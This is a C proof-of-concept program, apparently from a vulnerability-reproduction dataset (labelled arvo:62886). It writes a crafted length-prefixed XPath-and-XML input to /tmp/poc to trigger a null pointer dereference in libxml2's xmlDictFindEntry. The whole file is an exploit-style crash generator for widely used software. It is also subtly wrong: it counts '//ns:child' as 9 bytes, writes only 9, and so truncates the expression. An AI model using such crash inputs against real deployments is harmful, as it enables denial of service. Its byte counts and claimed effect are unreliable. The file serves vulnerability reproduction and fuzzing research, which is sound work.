#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:62886 */
/* Triggers: null pointer dereference in xmlDictFindEntry (libxml2 xpath) */
/* Vuln class: null_pointer_dereference */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Write 4-byte big-endian maxAllocs (0x00000000 = no limit) */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    
    /* XPath expression: "//ns:child" is 9 bytes */
    unsigned char xpath[] = "//ns:child";
    unsigned short xpath_len = 9;
    
    /* Write 2-byte big-endian length for XPath */
    fputc((xpath_len >> 8) & 0xFF, f);
    fputc(xpath_len & 0xFF, f);
    
    /* Write XPath expression bytes */
    fwrite(xpath, 1, xpath_len, f);
    
    /* XML document: "<root xmlns:ns=\"http://x\"/>" is 27 bytes */
    unsigned char xml[] = "<root xmlns:ns=\"http://x\"/>";
    unsigned short xml_len = 27;
    
    /* Write 2-byte big-endian length for XML */
    fputc((xml_len >> 8) & 0xFF, f);
    fputc(xml_len & 0xFF, f);
    
    /* Write XML document bytes */
    fwrite(xml, 1, xml_len, f);
    
    fclose(f);
    return 0;
}